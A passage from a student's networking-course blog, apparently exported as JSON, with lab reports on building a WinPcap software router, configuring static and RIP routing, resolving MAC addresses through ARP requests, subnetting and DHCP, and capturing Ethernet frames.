while (1) &#123; int rtn = pcap_next_ex(ahandle, &amp;pkt_header, &amp;pkt_data); if (rtn)break;//接收到消息 &#125; FrameHeader_t* header = (FrameHeader_t*)pkt_data; if (compare(header-&gt;DesMAC, selfmac))//目的mac是自己的mac &#123; else if (ntohs(header-&gt;FrameType) == 0x800)//IP格式的数据报 &#123; Data_t* data = (Data_t*)pkt_data; ltable.write2log_ip(\"接收\", data);//将接收内容写入日志 DWORD ip1_ = data-&gt;IPHeader.DstIP; DWORD ip_ = rtable.lookup(ip1_);//查找路由表中是否有对应表项 if(ip_==-1)continue;//如果没有则直接丢弃或直接递交至上层 if (checkchecksum(data))//如果校验和不正确，则直接丢弃不进行处理 &#123; if (data-&gt;IPHeader.DstIP != inet_addr(ip[0]) &amp;&amp; data-&gt;IPHeader.DstIP != inet_addr(ip[1])) &#123; //不是广播消息 int t1 = compare(data-&gt;FrameHeader.DesMAC, broadcast); int t2 = compare(data-&gt;FrameHeader.SrcMAC, broadcast); if (!t1 &amp;&amp; !t2) &#123; //ICMP报文包含IP数据包报头和其它内容 ICMP_t* temp_ = (ICMP_t*)pkt_data; ICMP_t temp = *temp_; BYTE mac[6]; if(ip_==0)//直接投递，查找目的IP的MAc &#123; //如果ARP表中没有所需内容，则需要获取ARP if (!arptable::lookup(ip1_, mac)) arptable::insert(ip1_, mac); resend(temp, mac);//转发 &#125; else if (ip_ != -1)//非直接投递，查找下一条IP的MAC &#123; if (!arptable::lookup(ip_, mac)) arptable::insert(ip_, mac); resend(temp, mac); &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125; ==resend消息转发== //数据报转发,修改源mac和目的macvoid resend(ICMP_t data, BYTE dmac[])&#123; Data_t* temp=(Data_t*)&amp;data; memcpy(temp-&gt;FrameHeader.SrcMAC, temp-&gt;FrameHeader.DesMAC, 6);//源MAC为本机MAC memcpy(temp-&gt;FrameHeader.DesMAC, dmac, 6);//目的MAC为下一跳MAC temp-&gt;IPHeader.TTL -= 1;//TTL-1 if (temp-&gt;IPHeader.TTL &lt; 0)return;//丢弃 setchecksum(temp);//重新设置校验和 int rtn = pcap_sendpacket(ahandle, (const u_char*)temp, 74);//发送数据报 if (rtn == 0) ltable.write2log_ip(\"转发\",temp);//写入日志&#125; ip打印 void ipprint(DWORD ip)&#123; in_addr addr; addr.s_addr = ip; char* pchar = inet_ntoa(addr); printf(\"%s\\t\", pchar); printf(\"\\n\");&#125; getmac打印MAC void getmac(BYTE MAC[])//打印mac&#123; printf(\"MAC地址为： \"); for (int i = 0; i &lt; 5; i++) printf(\"%02X-\", MAC[i]); printf(\"%02X\\n\", MAC[5]);&#125; 路由表添加 为方便寻找最长前缀表项，在插入时对掩码进行排序 void routetable::add(routeitem* a)&#123; routeitem* pointer; //找到合适的地方 //默认路由,一定是最开始的时候添加 if (!a-&gt;type)//直接投递 &#123; a-&gt;nextitem = head-&gt;nextitem; head-&gt;nextitem = a; a-&gt;type = 0; &#125; //其它，按照掩码由长至短找到合适的位置 else &#123; for (pointer = head-&gt;nextitem; pointer != tail &amp;&amp; pointer-&gt;nextitem != tail; pointer = pointer-&gt;nextitem)//head有内容，tail没有 &#123; if (a-&gt;mask &lt; pointer-&gt;mask &amp;&amp; a-&gt;mask &gt;= pointer-&gt;nextitem-&gt;mask || pointer-&gt;nextitem == tail) break; &#125; a-&gt;nextitem = pointer-&gt;nextitem; pointer-&gt;nextitem = a;//插入到合适位置 //a-&gt;type = 1; &#125; routeitem* p = head-&gt;nextitem; for (int i = 0; p != tail; p = p-&gt;nextitem, i++) &#123; p-&gt;index = i; &#125; num++;&#125; 路由表删除 void routetable::remove(int index)&#123; for (routeitem* t = head; t-&gt;nextitem != tail; t = t-&gt;nextitem) &#123; if (t-&gt;nextitem-&gt;index == index) &#123; if (t-&gt;nextitem-&gt;type == 0) &#123; printf(\"该项不可删除\\n\"); return; &#125; else &#123; t-&gt;nextitem = t-&gt;nextitem-&gt;nextitem; return; &#125; &#125; &#125; printf(\"无该表项\\n\");&#125; 遇到的问题 收到ping数据报但是不回复 可能使校验和设置错误，消息被接收方丢弃了 第一条能ping通，后面三条显示超时 处理了大量其它的消息，占用CPU资源，将筛选提前 ARP请求到的MAC是其它电脑的MAC 注意筛选收到的ARP请求的发送方IP ping发送方显示无法访问目标网络 打开运行路由器的主机中的routing and remote服务","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"wpcap","slug":"wpcap","permalink":"https://gitee.com/michelle19l/michelle19l/tags/wpcap/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"网络技术与应用作业五 互联网组网与路由器配置","slug":"大三上/计网/网技第五次实验","date":"2021-01-30T04:00:05.000Z","updated":"2021-02-22T14:42:32.832Z","comments":true,"path":"2021/01/30/大三上/计网/网技第五次实验/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"验证性实验（3）互联网组网与路由器配置实验内容说明 实体环境下互联网组网与路由器配置 在实体环境下完成互联网组网与路由器配置，要求如下：（1）在机房实验室环境下，通过将局域网划分为不同子网，用多IP主机作为路由器，组建互联网。（2）在命令行方式下，按照静态路由方式，配置路由器和主机，测试互联网的连通性。 仿真环境下的互联网组网与路由器配置 在仿真环境下完成互联网组网与路由器配置，要求如下：（1）学习路由器的配置方法和配置命令。（2）参考实体实验，组建由多个路由器组成的互联网。物理网络可以由集线器、交换机构成。（3）按照静态路由方式配置路由器和主机，测试互联网的连通性。（4）利用动态路由方式配置路由器和主机，测试互联网的连通性。（5）在仿真环境的“模拟”方式中观察数据包在互联网中的传递过程，并进行分析。 在仿真环境下完成下面实验 校园网用户的主机中安装有两块网卡，一块无线网卡通过带路由功能的AP接入Internet，一块网卡通过交换机直接接入校园网。假设校园网拥有的IP地址为202.118.25.xx，202.118.26.xx，202.118.27.xx，202.118.28.xx，202.118.29.xx，202.118.30.xx。配置用户的主机，使其通过学校交换机和路由器访问校园内的所有联网主机，通过带路由功能的AP访问其他Internet。 实验一： 实体环境下互联网组网与路由器配置实验准备在机房使用四台电脑完成实验，其中两台作为路由器，另外两台作为主机 配置信息： 使用route PRINT指令可以看到当前路由表信息 使用route ADD 目标网络 MASK 目标网络掩码 下一跳IP地址添加路由表表项 使用route CHANGE 目标网络 MASK 目标网络掩码 下一跳IP地址修改路由表表项 使用route DELETE 目标网络可以删除路由表 实验过程 首先 win+r，输入services.msc打开服务，启动路由和远程访问 为两台电脑配置IP和默认网关 两台作为路由器的电脑需要配置单网卡多IP（在配置路由界面的高级选项中） 在路由器上配置对应转发表 实验结果使用tracert命令，跟踪路由转发过程 结果与设计图相一致 实验二： 仿真环境下的互联网组网与路由器配置静态路由实验准备 实验步骤 按照如示意图所示配置四个终端的IP和默认网关 配置路由器IP 打开路由器的CLI界面，使用下图的指令分别配置两个路由器的接口Gig0/0、Gig0/1 配置路由表 使用指令ip route 目标网络 掩码 下一条IP地址，在路由器的cli中添加表项 - ip route 10.3.0.0 255.255.0.0 10.1.0.1 - ip route 10.2.0.0 255.255.0.0 10.1.0.2使用指令show ip route查看表项 实验结果在其中一个终端的命令行中使用tracert命令追踪数据流 结果与设计图一致 动态路由实验准备使用与静态路由完全相同的拓扑图和IP配置 实验过程 配置终端IP和网关（同静态路由配置） 配置RIP 另一台路由器使用相同的方法配置，只是将直接相连的网络修改为10.3.0.0和10.1.0.0 实验结果 连接成功 实验三为了同时使用不同的网卡并在访问不同的物理网络时使用不同的网卡，可以配置主机的路由表以达到效果","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"wpcap","slug":"wpcap","permalink":"https://gitee.com/michelle19l/michelle19l/tags/wpcap/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"网络技术与应用作业四 通过编程获取IP地址与MAC地址的对应关系","slug":"大三上/计网/网技第四次实验","date":"2021-01-30T04:00:04.000Z","updated":"2021-02-22T14:40:02.446Z","comments":true,"path":"2021/01/30/大三上/计网/网技第四次实验/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E5%9B%9B%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"综合性实验（2） 通过编程获取IP地址与MAC地址的对应关系实验内容说明通过编程获取IP地址与MAC地址的对应关系实验，要求如下： （1）在IP数据报捕获与分析编程实验的基础上，学习WinPcap（NPcap）的数据包发送方法。 （2）通过WinPcap（或NPcap）编程，获取IP地址与MAC地址的映射关系。 （3）程序要具有输入IP地址，显示输入IP地址与获取的MAC地址对应关系界面。界面可以是命令行界面，也可以是图形界面，但应以简单明了的方式在屏幕上显示。 （4）编写的程序应结构清晰，具有较好的可读性。 实验步骤项目设计思路本次实验需要获取主机网卡中对应IP的MAC地址，可以利用ARP请求方法，过程如下 获取网络接口卡列表，选择需要捕获MAC地址的网卡A（或选择对应的IP） 伪造ARP请求报文S，内容要求如下： ARP请求 广播 伪造源MAC地址和源IP地址 目的IP地址为网卡A的IP地址 用网卡A发送报文S‘ 对网卡A进行流量监听，筛选其中的ARP报文（类型为0x806），捕获网卡A的ARP响应报文，在响应报文的帧首部源MAC地址部分可以看到发送该ARP响应的网卡对应的MAC地址 注意：由于广播发送只能在相同网段的网卡内进行发送，而主机上各个网卡的IP可能并不在同一网段，例如子网掩码为255.255.255.0的两个IP192.168.89.1和192.168.240.1，不能接收到对方的广播消息。所以必须本次实验必须==使用相同的网卡发出和响应ARP报文== 关键代码分析 获取设备列表 将设备列表存储至alldevs中 pcap_findalldevs_ex(pcap_src_if_string, NULL, &amp;alldevs, errbuf) 打印网卡信息和对应IP int i = 0;for (pcap_if_t* d = alldevs; d != nullptr; d = d-&gt;next)//显示接口列表&#123; //获取该网络接口设备的ip地址信息 for (pcap_addr* a = d-&gt;addresses; a != nullptr; a = a-&gt;next) &#123; if (((struct sockaddr_in*)a-&gt;addr)-&gt;sin_family == AF_INET &amp;&amp; a-&gt;addr) &#123;//打印ip地址 i++; printf(\"%d \", i); //打印相关信息 //inet_ntoa将ip地址转成字符串格式 printf(\"%s\\t\", d-&gt;name, d-&gt;description); printf(\"%s\\t%s\\n\", \"IP地址:\", inet_ntoa(((struct sockaddr_in*)a-&gt;addr)-&gt;sin_addr)); net[i] =d; //将ip列表存入数组，方便后面选择目的ip和组装数据包 strcpy(ip[i], inet_ntoa(((struct sockaddr_in*)a-&gt;addr)-&gt;sin_addr)); &#125; &#125;&#125; 打印示例： 打开网络接口卡 pcap_t* open(char* name)//打开网络接口&#123; pcap_t *temp=pcap_open(name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 100, NULL, errbuf); if (temp==NULL) printf(\"error\"); return temp;//返回一个指针&#125; pcap_t* ahandle;//发送arp请求的网卡ahandle = open(net[index]-&gt;name); 组装报文 //报文格式#pragma pack(1)//以1byte方式对齐typedef struct FrameHeader_t &#123;//帧首部 BYTE DesMAC[6];//目的地址 BYTE SrcMAC[6];//源地址 WORD FrameType;//帧类型&#125;FrameHeader_t;typedef struct ARPFrame_t &#123;//IP首部 FrameHeader_t FrameHeader; WORD HardwareType;//硬件类型 WORD ProtocolType;//协议类型 BYTE HLen;//硬件地址长度 BYTE PLen;//协议地址长度 WORD Operation;//操作类型 BYTE SendHa[6];//发送方MAC地址 DWORD SendIP;//发送方IP地址 BYTE RecvHa[6];//接收方MAC地址 DWORD RecvIP;//接收方IP地址&#125;ARPFrame_t; //报文内容ARPFrame_t ARPFrame;//将APRFrame.FrameHeader.DesMAC设置为广播地址for (int i = 0; i &lt; 6; i++) ARPFrame.FrameHeader.DesMAC[i] = 0xff;//表示广播//将APRFrame.FrameHeader.SrcMAC设置为本机网卡的MAC地址for (int i = 0; i &lt; 6; i++) ARPFrame.FrameHeader.SrcMAC[i] = 0x0f;ARPFrame.FrameHeader.FrameType = htons(0x806);//帧类型为ARPARPFrame.HardwareType = htons(0x0001);//硬件类型为以太网ARPFrame.ProtocolType = htons(0x0800);//协议类型为IPARPFrame.HLen = 6;//硬件地址长度为6ARPFrame.PLen = 4;//协议地址长为4ARPFrame.Operation = htons(0x0001);//操作为ARP请求//将ARPFrame.SendHa设置为本机网卡的MAC地址for (int i = 0; i &lt; 6; i++) ARPFrame.SendHa[i] = 0x0f;//将ARPFrame.SendIP设置为本机网卡上绑定的IP地址ARPFrame.SendIP = inet_addr(\"122.122.122.122\");//将ARPFrame.RecvHa设置为0for(int i=0;i&lt;6;i++) ARPFrame.RecvHa[i] = 0;//表示目的地址未知//将ARPFrame.RecvIP设置为请求的IP地址ARPFrame.RecvIP = inet_addr(ip[index]); 注意：帧首部信息中的目的MAC地址为==全1==代表该条报文需要==广播==发送，而请求报文的目的MAC地址为==全0==表示==目的地址未知== 发送消息 用ahandle网卡发送ARPFrame中的内容，报文长度为sizeof(ARPFrame_t)，如果发送成功，返回0 pcap_sendpacket(ahandle, (u_char*)&amp;ARPFrame, sizeof(ARPFrame_t)) 捕获流量 while (1)//可能会捕获到多条消息 &#123; pcap_pkthdr* pkt_header; const u_char* pkt_data; int rtn = pcap_next_ex(ahandle, &amp;pkt_header, &amp;pkt_data); if (rtn == 1) &#123; ARPFrame_t* IPPacket = (ARPFrame_t*)pkt_data; if (ntohs(IPPacket-&gt;FrameHeader.FrameType) == 0x806) &#123;//输出目的MAC地址 if (!compare(IPPacket-&gt;FrameHeader.SrcMAC, ARPFrame.FrameHeader.SrcMAC))//不是一开始发送的广播arp请求 &#123; printf(\" MAC地址为:\"); //输出MAC地址 for (int i = 0; i &lt; 6; i++) &#123; printf(\"%02x.\", IPPacket-&gt;FrameHeader.SrcMAC[i]); &#125; break;//找到MAc地址，退出 &#125; &#125; &#125; &#125; 获取远程网卡的MAC地址 获取远程MAC地址有两个方法 方法一：封装ARP请求时使用本机网卡的IP和MAC地址 先利用上述方法请求本地网卡的MAC地址，将本机IP和MAC填入报文 ARPFrame.FrameHeader.SrcMAC[i] = IPPacket-&gt;FrameHeader.SrcMAC[i];ARPFrame.SendHa[i] = IPPacket-&gt;FrameHeader.SrcMAC[i]; 重新发送ARP请求 pcap_sendpacket(ahandle, (u_char*)&amp;ARPFrame, sizeof(ARPFrame_t)) 注意这里会返回网关和远程主机的MAC地址 方法二：直接使用伪造的IP和MAC地址进行发送 虽然本机网卡发送时需用的是虚拟MAC和IP地址，但是网关接收到组建的ARP请求后会由网关发出一个ARP请求，找到本机发送网卡的真实IP和MAC地址，从而进一步获取远程主机的MAC。 实验结果 查询1（本机）： 使用命令行进行查询 结果一致 查询2（远程）： 结果一致 查询3（对应网关）","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"wpcap","slug":"wpcap","permalink":"https://gitee.com/michelle19l/michelle19l/tags/wpcap/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"网络技术与应用作业三 IP地址规划与配置","slug":"大三上/计网/网技第三次实验","date":"2021-01-30T04:00:03.000Z","updated":"2021-02-22T14:42:20.556Z","comments":true,"path":"2021/01/30/大三上/计网/网技第三次实验/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"验证性实验（2）IP地址规划与配置实验内容说明（1）对给定IP地址范围进行子网划分。 （2）在真实局域网和仿真局域网环境下手工完成IP地址分配，使用Ping命令测试分配不同IP地址时，网络的连通性。 （3）在仿真环境下配置DHCP协议，实现IP地址的自动配置。 实验一 IP地址的子网划分真实环境 打开电脑A、B、C，关闭防火墙 IP地址与子网掩码的分配和连通性测试 统一使用IP：192.168.12.xxx，掩码：255.255.255.xxx，为简化说明过程，下表只给出IP和掩码的后八位 主机 IP 子网掩码 子网号 主机号 最后八位的ip和掩码对应关系 A 193 192 3 1 1100 0001 1100 0000 B 194 192 3 2 1100 0010 1100 0000 C 67 192 1 3 0100 0011 1100 0000 结果显示 子网号相同的情况下可以ping通 子网号不同的情况下不可以ping通 虚拟环境 拓扑图 IP和子网掩码的配置 统一使用IP：192.168.12.xxx，掩码：255.255.255.xxx，为简化说明过程，下表只给出IP和掩码的后八位 主机 IP 子网掩码 子网号 主机号 最后八位的ip和掩码对应关系 PC0是否能ping通 PC0 201 192 3 9 1100 1001 能 1100 0000 PC1 202 192 3 10 1100 1001 能 1100 0000 PC2 203 240 12 12 1100 1011 能 1111 0000 PC3 220 192 3 28 1101 1100 能 1100 0000 PC4 221 240 13 13 1101 1101 不能，子网号不同 1111 0000 PC6 129 192 3 17 1001 0001 不能，子网号不同 1100 0000 PC4与PC6不能相互ping通，子网号和掩码不同 根据实验结果观察可知 可以ping通 不可以ping通 子网号相同 子网号不同且之间没有$2^n$倍数关系 子网号和掩码不同但子网号之间之间有$2^n$倍数关系（见PC2） 实验二 DHCP的配置拓扑图 配置过程 服务器 配置服务器IP 配置DHCP 中断自动获取IP地址 调整IP获取方式为DHCP 获取IP地址 另一个终端为","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"packettracer","slug":"packettracer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/packettracer/"},{"name":"大三上学期课程内容","slug":"大三上学期课程内容","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9/"},{"name":"网络技术与应用","slug":"网络技术与应用","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/"}]},{"title":"网络技术与应用作业二 WPcap的安装与基本使用","slug":"大三上/计网/网技第二次实验","date":"2021-01-30T04:00:02.000Z","updated":"2021-02-22T14:42:11.485Z","comments":true,"path":"2021/01/30/大三上/计网/网技第二次实验/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2021/01/30/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E7%BD%91%E6%8A%80%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"网络技术与应用第二次实验报告[TOC] 实验内容说明作业题目：综合性实验（1） 利用WinPcap编程捕获数据包 作业说明： （1）了解WinPcap（或LibPcap、NPcap）的架构。（2）学习WinPcap（或LibPcap、NPcap）的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。（3）学习多线程（或多进程）程序编写方法。（4）通过WinPcap（或LibPcap、NPcap）编程，实现本机的数据包的捕获，显示以太帧的源地址、目的地址和帧类型/长度。（5）捕获的数据报不要求硬盘存储，但应以简单明了的方式在屏幕上显示。必显字段包括源MAC地址、目的MAC地址、帧类型/长度。（6）编写的程序应结构清晰，具有较好的可读性。 实验准备（1）WinPcap架构。WinPcap是一个win32平台下的数据报捕获体系架构，它的主要功能是进行数据报捕获和网络分析。它包含了 内核级别的包过滤：在操作系统内核中运行Netgroup Packet Fileter(NPF)设备驱动程序来与网络接口驱动直接交互。NPF提供了数据包捕获与发送的基本特性，同时也提供了一个可编程的过滤系统。可以用于限制一个会话，只捕获特定的网络数据包。 低层次的动态链接库（packet.dll）：提供底层API，可以用来直接访问驱动程序的函数，提供一个独立于微软的不同操作系统的编程接口。 高级别系统无关的函数库（wpcap.dll）：提供与其它系统下的pcap程序（如libpcap）的兼容性。 本次实验将利用WinPcap高级别系统无关函数库中提供的函数对流经网卡的数据包进行捕获。 一般利用WinPcap捕获数据报需要经过3个步骤 获取设备列表 打开网络接口 在打开的网络接口卡上捕获网络数据包 （2）WinPcap的设备列表获取方法、网卡设备打开方法，以及数据包捕获方法。==获取设备列表==函数原型与参数解析： int pcap_findalldevs_ex( //指定从哪里获得接口列表，该函数可以获取本机、远程设备和文件的网络接口列表 //如果希望得到本机的网络接口列表，可以使用PCAP_SRC_IF_STRING常数 char* source; //在获取远程设备的网络接口列表时，如果远程设备需要认证，则需要使用该参数 //该参数对获取本机的网络接口列表没有任何意义，给NULL即可 struct pcap_rmtauth auth, //函数成功返回后，该参数指向获取的网络接口列表的第一个元素，列表中的所有元素都是一个pcap_if_t结构 pcap_if_t **alldevs, //用户定义的存放错误信息的缓冲区，缓冲区长度不饿能小于PCAP_ERRBUF_SIZE char* errbuf;) 返回值： 调用发生错误时，返回-1，具体错误信息输出到errbuf中调用成功时返回0 pcap_if_t结构结构定义： Typedef struct pcap_if pcap_if_t;/* * Item in a list of interfaces. */struct pcap_if &#123; struct pcap_if *next;//指向下一个网卡 char *name; /* name to hand to \"pcap_open_live()\" *///网卡名 char *description; /* textual description of interface, or NULL */ struct pcap_addr *addresses;//IP地址，一块网卡上可能有很多个IP地址，使用链表格式存储 bpf_u_int32 flags; /* PCAP_IF_ interface flags */&#125;; 释放设备列表函数原型: void pcap_freealldevs(pcap_if_t* alldevs); ==打开网络接口==在对某一个网络接口卡进行监听之前，首先需要将其打开 函数原型与参数解析： pcap_t *pcap_open( const char *source, //指向需要打开的网络接口卡的名字 int snaplen, //获取数据报的最大长度 int flags, //指定以核中方式打开网络接口设备并获取数据包，最常用的时PCAP_OPENFLA_PROMISCUOUS,它通知系统以混杂模式打开网络接口设备 int read_timeout, //数据包捕获函数等待一个数据包的最大时间，如果该段时间内没有捕获到数据包，将以0值返回 struct pcap_rmtauth *auth,//捕获本机时设为NULL char *errbuf//用户自定义的存放错误信息的缓冲区); 返回值： 调用出错时返回NULL成功时返回一个指向pcap_t的指针 ==在打开的网络接口卡上捕获网络数据包==函数原型与参数解析： int pcap_next_ex( pcap_t * p, struct pcap_pkthdr ** pkt_header,//数据包头部基本信息，捕获时间、长度等 const u_char ** pkt_data//数据包具体内容); 返回值 正确捕获到数据包，返回1，pkt_header保存数据包基本信息，pkt_data指向捕获数据包的完整数据没有捕获到信息，返回0，超过参数read_timeout限制，此时pkt_header和pkt_data均不可用调用过程中发生错误，返回-1 （3）多线程（或多进程）编程函数原型与参数解析： HANDLEWINAPICreateThread( _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,//NULL _In_ SIZE_T dwStackSize,//NULL _In_ LPTHREAD_START_ROUTINE lpStartAddress,//线程函数名 _In_opt_ __drv_aliasesMem LPVOID lpParameter,//函数参数 _In_ DWORD dwCreationFlags,//0 _Out_opt_ LPDWORD lpThreadId//线程标号 ); 样例： //全局变量//多线程HANDLE hThread;DWORD dwThreadId; //主函数while (1) &#123; for (pcap_if_t* d = alldevs; d != NULL; d = d-&gt;next) &#123; hThread = CreateThread(NULL, NULL, handlerRequest, LPVOID(d-&gt;name), 0, &amp;dwThreadId); //执行完一个线程函数后等待500ms WaitForSingleObject(hThread, 500); &#125; &#125; DWORD WINAPI handlerRequest(LPVOID lparam)&#123; char* name = (char*)lparam;//接受参数 get_info(name);//执行过程 return 0;//返回值&#125; 实验步骤目的：通过WinPcap（或LibPcap、NPcap）编程，实现本机的数据包的捕获，显示以太帧的源地址、目的地址和帧类型/长度。 环境的配置与头文件和库 在官网http://www.winpcap.org下载WinPca软件和相应驱动程序```developer&#39;s pack```，执行exe文件并解压压缩包 在目录WpdPack\\Include\\pcap目录下的pcap.h中添加一行#define WIN32 创建项目，资源管理器的资源文件-&gt;添加-&gt;导入现有项，添加WpdPack目录下的两个lib文件：Packet.lib和wpcap.lib 在项目-&gt;属性-&gt;C/C++中将winpcap\\WpdPack\\Include添加到附加包含目录 将WPCAP和HAVE_REMOTE两个标号添加到预处理器定义中 在程序中引入相应的包和库。注意，#include &quot;pcap.h&quot;后不需要再引入iostream、stdio.h等头文件 include \"pcap.h\"#pragma comment(lib,\"ws2_32.lib\")//链接ws2_32.lib库文件到此项目中 数据结构的定义，数据分为帧首部和IP首部，其中帧首部的目的地址、源地址和帧长度/类型是我们本次实验需要捕获并显示的内容。 并且，C语言变量以4bytes对齐，不足4bytes的变量编译器自动填充，所以，为了方便数据类型的转换，设置为以1字节对齐。例如，对于类型FrameHeader_t，如果以1bytes对齐，一个该类型变量将占用6+6+2=14bytes，若以4bytes对齐，将补齐为16字节。 #pragma pack(1)//以1byte方式对齐typedef struct FrameHeader_t &#123;//帧首部 BYTE DesMAC[6];//目的地址 BYTE SrcMAC[6];//源地址 WORD FrameType;//帧类型&#125;frameHeader_t;typedef struct IPHeader_t &#123;//IP首部 BYTE Ver_HLen; BYTE TOS; WORD TotalLen; WORD ID; WORD Flag_Segment; BYTE TTL; BYTE Protocol; WORD Checksum; ULONG SrcIP; ULONG DstIP;&#125;IPHeader_t;typedef struct Data_t &#123;//包含帧首部和IP首部的数据包 FrameHeader_t FrameHeader; IPHeader_t IPHeader;&#125;Data_t;#pragma pack()//恢复4bytes对齐 获取本机设备列表 //PCAP_SRC_IF_STRING为const char* 型，需要转换为char*类型char *pcap_src_if_string = new char[strlen(PCAP_SRC_IF_STRING)];strcpy(pcap_src_if_string, PCAP_SRC_IF_STRING); void find_alldevs() //获取本机的设备列表&#123; //该函数第一个参数类型为char*类型 //使用pcap_findalldevs_ex函数，将设备列表存储到alldevs中 if (pcap_findalldevs_ex(pcap_src_if_string, NULL, &amp;alldevs, errbuf) == -1) &#123; //如果出现错误，则打印错误信息 printf(\"%s\", \"error\"); &#125;&#125; 用pcap_open函数打开特定网络接口卡 //指定网卡名称pcap_t* p = pcap_open(name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 100, NULL, errbuf); if (p == NULL) &#123; printf(\"error\"); return; &#125; 利用函数pcap_next_ex捕捉网卡信息，并将数据内容信息存储再pkt_data中，如果成功捕获，则返回1 pcap_pkthdr* pkt_header;const u_char* pkt_data;int rtn = pcap_next_ex(p, &amp;pkt_header, &amp;pkt_data); 为了便于信息提取，需要将捕获到的char*类型数据pkt_data转换为Data_t类型 //printf(\"%s\\t%s\\n\", d-&gt;name, d-&gt;description);Data_t* IPPacket;//WORD RecvChecksum;IPPacket = (Data_t*)pkt_data; 对于源MAC地址和目的MAC地址的打印，由于FrameHeader.DesMAC和SrcMAC为byte类型数组，需要将其元素以16进制数的形式打印 //输出目的MAC地址printf( \"目的MAC地址：\");for (int i = 0; i &lt; 6; i++)&#123; printf(\"%02x\", IPPacket-&gt;FrameHeader.DesMAC[i]);&#125;printf( \" 源MAC地址:\");//输出源MAC地址for (int i = 0; i &lt; 6; i++)&#123; printf(\"%02x\", IPPacket-&gt;FrameHeader.SrcMAC[i]);&#125; 由于网络序和主机b序采用的大小端约定不同，所以对于WORD类型的帧类型/长度，需要使用ntohs函数转换 printf( \" 帧类型/长度：\");//ntohs((u_short)IPPacket-&gt;FrameHeader.FrameType);printf(\"%02x\", ntohs(IPPacket-&gt;FrameHeader.FrameType));printf(\"H\\n\"); 为了同时监听所有网卡，需要使用多线程编程 //线程函数定义DWORD WINAPI handlerRequest(LPVOID lparam)&#123; char* name = (char*)lparam; get_info(name);//监听网卡，捕获信息相关函数 return 0;&#125; //线程函数调用while (1) &#123;for (pcap_if_t* d = alldevs; d != NULL; d = d-&gt;next) &#123; hThread = CreateThread(NULL, NULL, handlerRequest, LPVOID(d-&gt;namec), 0, &amp;dwThreadId); //延迟，减少无用的线程以减小CPU负担 WaitForSingleObject(hThread, 500); &#125; &#125; 关闭网卡 pcap_freealldevs(alldevs); 实验结果 其中 类型/长度=0800H，指定是IP类型数据报 